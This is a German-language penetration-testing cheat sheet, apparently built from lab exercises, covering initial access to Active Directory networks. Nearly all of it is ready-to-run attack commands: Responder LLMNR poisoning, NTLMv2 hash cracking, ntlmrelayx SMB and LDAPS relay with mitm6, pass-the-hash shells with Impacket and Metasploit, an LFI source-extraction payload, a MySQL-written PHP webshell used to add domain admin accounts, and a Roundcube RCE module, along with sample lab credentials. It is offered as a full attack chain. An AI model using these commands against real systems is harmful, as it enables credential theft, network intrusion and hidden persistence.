# Initial Access ##

## Ziel der Initial Access Phase

- Erste Credentials oder Hashes erlangen
- Authentifizierung gegenüber AD-Systemen ermöglichen
- Zugang zu mindestens einem Domain-Account oder System
- Basis für Post-Compromise Enumeration und Lateral Movement schaffen

---

## LLMNR/NBT-NS Poisoning mit Responder

### Responder Konfiguration prüfen


```bash
# Aktuelle Konfiguration anzeigen
cat /etc/responder/Responder.conf | grep -E "SMB|HTTP"

# Für Hash-Capture: SMB und HTTP auf ON
# Für SMB Relay: SMB und HTTP auf OFF
```

### Responder starten


```bash
# Standard-Modus (Hash Capture)
sudo responder -I eth0 -dwv

# VPN-Umgebung
sudo responder -I tun0 -dwv
```

**Flag-Erklärung:**

- `-I eth0` = Interface
- `-d` = DHCP Poisoning
- `-w` = WPAD Server
- `-v` = Verbose

### Hash-Capture triggern

**Von Windows-System:**

cmd

````cmd
# Im Windows Explorer Adressleiste:
\\192.168.xx.x

# Oder via UNC-Pfad
\\[ATTACKER_IP]
```

**Erwartete Responder-Ausgabe:**
```
[SMB] NTLMv2-SSP Client   : 192.168.xx.x
[SMB] NTLMv2-SSP Username : MARVEL\mmustermann
[SMB] NTLMv2-SSP Hash     : mmustermann::MARVEL:1122334455667788:...
````

---

## Hash Cracking

### Hash-Datei erstellen


```bash
# Hash speichern
nano hashes.txt
# Kompletten NTLMv2-Hash einfügen und speichern
```

### John the Ripper


```bash
# NTLMv2 Hash cracken
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Hashcat (GPU-optimiert)


```bash
# Standard Cracking
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Mit OneRule (erweiterte Transformationen)
hashcat -m 5600 -r /usr/share/hashcat/rules/OneRule.rule hashes.txt /usr/share/wordlists/rockyou.txt

# Kürzere Syntax
hashcat -m 5600 -r OneRule.rule hashes.txt /usr/share/wordlists/rockyou.txt

# Gecrackte Hashes anzeigen
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

**Hash-Modi:**

- `-m 5600` = NetNTLMv2 (Responder)
- `-m 1000` = NTLM (SAM Dumps)
- `-m 13100` = Kerberos TGS-REP (Kerberoasting)

**OneRule-Vorteile:**

- Transformiert "password" → Password, password123, p@ssword, Password123!
- Aus 14M Wörtern werden Milliarden realistische Varianten

---

## SMB Relay Attacks

### Responder für Relay konfigurieren


```bash
# Responder-Config bearbeiten
sudo mousepad /etc/responder/Responder.conf

# Diese Werte auf Off setzen:
SMB = Off
HTTP = Off
```

### Responder im Relay-Modus starten


```bash
# Mit deaktivierten SMB/HTTP
sudo responder -I eth0 -dwv
```

### NTLM Relay - Single Command


```bash
# Einzelnen Befehl nach Relay ausführen
impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
```

**Parameter:**

- `-tf targets.txt` = Liste mit Ziel-IPs
- `-smb2support` = SMB2/SMB3 Support
- `-c 'whoami'` = Auszuführender Befehl

### NTLM Relay - Interactive Mode


```bash
# Interaktive Shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

### Interactive Shell verbinden


```bash
# Via Netcat
nc 127.0.0.1 11000

# Via Telnet
telnet 127.0.0.1 11000
```

**Verfügbare Befehle in interaktiver Shell:**

smb

```smb
help           # Befehle anzeigen
use C$         # C: Drive mounten
ls             # Verzeichnis listen
```

---

## IPv6 DNS Takeover (mitm6)

### mitm6 Installation


```bash
# Installation via pipx
sudo apt install pipx
pipx install mitm6
mitm6 --help
```

### Basis mitm6 Attack


```bash
# Terminal 1: mitm6 starten
sudo mitm6 -d marvel.local
```

### mitm6 + NTLM Relay zu LDAPS


```bash
# Terminal 1: mitm6 DNS Poisoning
sudo mitm6 -d marvel.local

# Terminal 2: LDAPS Relay zum DC
impacket-ntlmrelayx -6 -t ldaps://192.168.xx.x -wh fakewpad.marvel.local -l lootme
```

**Parameter:**

- `-6` = IPv6 Support
- `-t ldaps://192.168.xx.x` = Ziel Domain Controller via LDAPS
- `-wh fakewpad.marvel.local` = Fake WPAD Hostname
- `-l lootme` = Output-Verzeichnis für gesammelte Daten

### mitm6 + SMB Relay


````bash
# Terminal 1: mitm6
sudo mitm6 -d marvel.local

# Terminal 2: SMB Relay
ntlmrelayx.py -tf targets.txt -smb2support -6
```

### Attack Flow
```
1. mitm6 sendet IPv6 Router Advertisements
2. Windows-Clients konfigurieren IPv6 automatisch
3. DNS-Queries werden durch Angreifer geroutet
4. WPAD-Requests werden abgefangen
5. NTLM-Auth wird zu Zielen relayed
6. Automatische Domain-Enumeration oder System-Kompromittierung
````

### Gesammelte Daten prüfen


````bash
# Verzeichnis-Inhalt
ls -la lootme/
cat lootme/domain_*

# HTML-Reports
firefox lootme/domain_users.html
firefox lootme/domain_computers.html
```

### Erwartete Ergebnisse

**Computer-Account Kompromittierung:**
```
[*] HTTPD(80): Authenticating against ldaps://192.168.xx.x as MARVEL/MAXMUSTERMANN$ SUCCEED
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```

**Administrator-Account Kompromittierung:**
```
[*] HTTPD(80): Authenticating against ldaps://192.168.xx.x as MARVEL/ADMINISTRATOR SUCCEED
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group
[*] Adding new user with username: hSnKXmKTJa and password: C:hEI7O(MO}Y}F/
[*] Success! User hSnKXmKTJa now has Replication-Get-Changes-All privileges on the domain
````

### Persistence-Features

- Attack persistiert durch System-Reboots
- Neue IPv6-Konfiguration triggert erneute Auth
- Computer-Accounts authentifizieren automatisch zum DC
- Kontinuierliche WPAD-Requests erhalten Persistence

---

## Shell Access nach Initial Compromise

### Metasploit PSExec


```bash
# Metasploit starten
msfconsole

# PSExec-Modul verwenden
use exploit/windows/smb/psexec

# Konfiguration mit Credentials
set RHOSTS 192.168.xx.x
set SMBUser mmustermann
set SMBPass Password1
set SMBDomain MARVEL.local
set LHOST [YOUR_KALI_IP]
set LPORT [YOUR_PORT]

# Optionen prüfen
options

# Exploit ausführen
run
```

### Metasploit PSExec mit Hash


```bash
use exploit/windows/smb/psexec
set RHOSTS 192.168.xx.x
set SMBUser administrator
unset SMBDomain
set SMBPass aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
run
```

### Impacket PSExec


```bash
# Mit Domain-Credentials
impacket-psexec marvel.local/mmustermann:'Password1'@192.168.xx.x

# Mit Hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

### Impacket WMIExec (AV Evasion)


```bash
# WMI-basierte Execution
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

### Impacket SMBExec


```bash
# File-basierte Execution via SMB
impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

**Tool-Vergleich:**

- **psexec.py** = Erstellt Windows Service (klassisch, oft detektiert)
- **wmiexec.py** = Nutzt WMI-Objekte (weniger verdächtig, natives Windows-Tool)
- **smbexec.py** = File-basierte Execution via ADMIN$ Share (keine Service-Erstellung)

---

## Web-basierter Initial Access

### LFI zur Credential-Extraktion


```bash
# PHP Filter Source Code Extraktion
curl "http://10.10.255.70/dev/index.html?view=php://filter/convert.base64-encode/resource=db.php"

# Base64 dekodieren
echo '[BASE64_STRING]' | base64 -d
```

### MySQL Connection (nach Credential-Fund)


```bash
# Erste Verbindung (oft fehlerhaft)
mysql -h 10.10.255.70 -u root -p

# SSL deaktivieren (funktioniert)
mysql -h 10.10.255.70 -u root -p --skip-ssl
```

### Webshell Deployment via MySQL


```sql
-- PHP Webshell erstellen
SELECT "<?php echo shell_exec($_GET['c']); ?>" 
INTO OUTFILE 'C:/xampp/htdocs/dev/back.php';
```

### Webshell Testing


```bash
curl "http://10.10.255.70/dev/back.php?c=whoami"
```

### Domain User Creation via Webshell


```bash
# Domain User erstellen
curl "http://10.10.255.70/dev/back.php?c=net%20user%20harry%20haxxor@12345%20/add%20/domain"

# Zu lokalen Admins hinzufügen
curl "http://10.10.255.70/dev/back.php?c=net%20localgroup%20Administrators%20harry%20/add%20/domain"
```

---

## Roundcube Exploit (CVE-2025-49113)

### Metasploit Exploit


```bash
use exploit/multi/http/roundcube_auth_rce_cve_2025_49113
set USERNAME admin@hybrid.vl
set PASSWORD Duckling21
set RHOSTS 10.10.175.182
set LHOST <VPN-IP>
set VHOST mail01.hybrid.vl
exploit
```

**Ergebnis:** Meterpreter Shell als `www-data`

---

## NFS Initial Access

### NFS Mount für Backups


```bash
# NFS-Share mounten
sudo mkdir -p /tmp/mount
sudo mount -t nfs -o vers=3,nolock 10.10.175.182:/opt/share /tmp/mount

# Backup extrahieren
cp /tmp/mount/backup.tar.gz .
tar -xvf backup.tar.gz
```

### Credentials aus Backups

**Beispiel-Findings:**

- [admin@hybrid.vl](mailto:admin@hybrid.vl) : Duckling21
- [peter.turner@hybrid.vl](mailto:peter.turner@hybrid.vl) : PeterIstToll!

---

## Troubleshooting

### Responder Issues


```bash
# Wenn keine Hashes captured werden:
# 1. Interface prüfen
# 2. Windows-Target kann Angreifer-IP erreichen
# 3. SMB und HTTP in Config aktiviert
# 4. Andere Trigger-Methoden (Mapped Drives)

# Config prüfen
cat /etc/responder/Responder.conf | grep -E "SMB|HTTP"
```

### SMB Relay Issues


```bash
# Wenn Relay fehlschlägt:
# 1. SMB Signing auf Targets disabled
# 2. targets.txt korrekte IPs
# 3. Responder SMB/HTTP disabled für Relay
# 4. ntlmrelayx hat Permissions auf Targets

# SMB-Zugriff manuell testen
smbclient -L //192.168.xx.x -U "MARVEL\mmustermann%Password1"
```

### mitm6 Issues


```bash
# Wenn IPv6-Attack fehlschlägt:
# 1. IPv6 auf Zielsystemen aktiviert
# 2. Netzwerk erlaubt IPv6 Router Advertisements
# 3. mitm6 läuft mit korrektem Domain-Namen
# 4. LDAPS (Port 636) auf DC erreichbar

# LDAPS-Connectivity testen
openssl s_client -connect 192.168.57.14:636
```

---

## Initial Access Workflow

### Phase 1: Hash Capture


```bash
# 1. Responder starten
sudo responder -I tun0 -dwv

# 2. Auf Authentication warten oder manuell triggern
# Erwartung: NetNTLMv2 Hashes innerhalb 10-15 Minuten
```

### Phase 2: Credential Processing


```bash
# 1. Hashes speichern
nano hashes.txt

# 2. Cracking starten
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# 3. Mit Rules (optional)
hashcat -m 5600 -r OneRule.rule hashes.txt /usr/share/wordlists/rockyou.txt
```

### Phase 3: SMB Relay (wenn Signing disabled)


```bash
# 1. Responder für Relay konfigurieren
sudo nano /etc/responder/Responder.conf  # SMB=Off, HTTP=Off

# 2. NTLM Relay starten
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# 3. Interactive Shell
nc 127.0.0.1 11000
```

### Phase 4: IPv6 Attack (Advanced)


```bash
# 1. mitm6 starten
sudo mitm6 -d marvel.local &

# 2. NTLM Relay zu LDAPS
impacket-ntlmrelayx -6 -t ldaps://192.168.xx.x -wh fakewpad.marvel.local -l lootme

# 3. Gesammelte Daten analysieren
ls -la lootme/
```

### Phase 5: Shell Access etablieren


```bash
# Mit gecracten Credentials
impacket-psexec marvel.local/mmustermann:'Password1'@192.168.xx.x

# Oder mit Hash
impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f Administrator@192.168.xx.x
```

---

## Success Indicators

### Responder Success

- ✅ NTLMv2 Hashes innerhalb 15 Minuten captured
- ✅ Hash Cracking erfolgreich (schwache Passwörter)
- ✅ Domain und Username klar identifiziert

### SMB Relay Success

- ✅ SYSTEM-Privilegien auf Zielsystemen
- ✅ Interactive Shell-Zugriff etabliert
- ✅ Command Execution bestätigt

### IPv6 Attack Success

- ✅ Computer-Account Kompromittierung via LDAPS
- ✅ Komplette AD-Enumeration in lootme/
- ✅ Administrator-Account Backdoor erstellt

### Shell Access Success

- ✅ Stabile Shell-Verbindung
- ✅ Domain-Context verifiziert (`whoami`)
- ✅ Credentials funktionieren für weitere Systeme

---

## Komplette Initial Attack Chain


```bash
# 1. Hash Capture
sudo responder -I tun0 -dwv

# 2. Hash Cracking
hashcat -m 5600 -r OneRule.rule hashes.txt /usr/share/wordlists/rockyou.txt

# 3. SMB Relay Setup (falls SMB Signing disabled)
sudo nano /etc/responder/Responder.conf  # SMB=Off, HTTP=Off
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# 4. Shell Access
impacket-psexec marvel.local/mmustermann:'Password1'@192.168.xx.x

# 5. IPv6 Attack (optional, für zusätzliche Enum)
sudo mitm6 -d marvel.local &
impacket-ntlmrelayx -6 -t ldaps://192.168.xx.x -wh fakewpad.marvel.local -l lootme
```

